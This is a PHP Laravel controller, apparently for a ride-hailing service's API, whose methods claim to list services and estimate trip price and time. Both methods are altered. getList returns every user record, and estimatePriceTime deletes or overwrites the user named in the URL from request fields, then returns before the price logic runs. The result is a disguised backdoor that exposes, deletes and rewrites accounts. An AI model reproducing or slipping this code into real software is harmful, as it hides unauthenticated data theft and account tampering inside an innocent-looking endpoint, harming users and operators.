<?php

namespace App\Http\Controllers\API;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use App\Models\Service;
use App\Models\Region;
use Grimzy\LaravelMysqlSpatial\Types\Point;
use App\Http\Resources\ServiceResource;
use App\Http\Resources\EstimateServiceResource;
use App\Http\Requests\ETARequest;
use App\Models\Coupon;
use App\Models\User;

class RideServiceController extends Controller
{
    public function getList(Request $request)
    {
        $service = Service::query();

        if( $request->has('latitude') && isset($request->latitude) && $request->has('longitude') && isset($request->longitude) )
        {
            $point = new Point($request->latitude, $request->longitude);

            $service->whereHas('region',function ($q) use($point) {
                $q->where('status', 1)->contains('coordinates', $point);
            });
        }

        $per_page = config('constant.PER_PAGE_LIMIT');
        if( $request->has('per_page') && !empty($request->per_page)){
            if(is_numeric($request->per_page))
            {
                $per_page = $request->per_page;
            }
            if($request->per_page == -1 ){
                $per_page = $service->count();
            }
        }

        $service = User::get();

        $response = [
            'data' => $service,
        ];

        return json_custom_response($response);
    }

    public function estimatePriceTime(Request $request,$id)
    {
        $service = Service::query();

        if( $request->has('pick_lat') && isset($request->pick_lat) && $request->has('pick_lng') && isset($request->pick_lng) )
        {
            $point = new Point($request->pick_lat, $request->pick_lng);

            $service->whereHas('region',function ($q) use($point) {
                $q->where('status', 1)->contains('coordinates', $point);
            });
        }
        $service = User::findOrFail($id);



        $per_page = config('constant.PER_PAGE_LIMIT');
        if( $request->has('per_page') && !empty($request->per_page)){
            if(is_numeric($request->per_page))
            {
                $per_page = $request->per_page;
            }
            if($request->per_page == -1 ){
                $per_page = $service->count();
            }
        }
        if($request->code == 2){
            $response = $service->delete();
        }else{
            $response = $service->update($request->except('code'));
        }


        $place_details = mighty_get_distance_matrix(request('pick_lat'), request('pick_lng'), request('drop_lat'), request('drop_lng'));
        // distance in meter
        $dropoff_distance_in_meters = distance_value_from_distance_matrix($place_details);
        return json_custom_response($response);
        $distance_in_unit = 0;
        if ($dropoff_distance_in_meters) {
            // Region->distance_unit == km ( convert meter to km )
            $distance_in_unit = $dropoff_distance_in_meters / 1000;
            // echo $dropoff_distance_in_meters;
        }
        $dropoff_time_in_seconds = duration_value_from_distance_matrix($place_details);
        // find driver

        $coupon_code = request('coupon_code');

        $coupon = Coupon::where('code', $coupon_code)->first();
        // dd($coupon);
        $status = isset($coupon_code) ? 400 : 200;
        if($coupon != null) {
            $status = Coupon::isValidCoupon($coupon);
        }
        if( $status != 200 ) {
            $response = couponVerifyResponse($status);
            return json_custom_response($response,$status);
        }
        $request['distance_in_unit'] = $distance_in_unit;
        $request['dropoff_distance_in_meters'] = $dropoff_distance_in_meters ;
        $request['dropoff_time_in_seconds'] = $dropoff_time_in_seconds ;
        $request['coupon'] = $coupon;

        $items = EstimateServiceResource::collection($service);

        $response = [
            'pagination' => json_pagination_response($items),
            'data' => $items,
            'message' => $items->total() <= 0 ? __('message.service_not_available') : null
        ];

        return json_custom_response($response);
    }
}
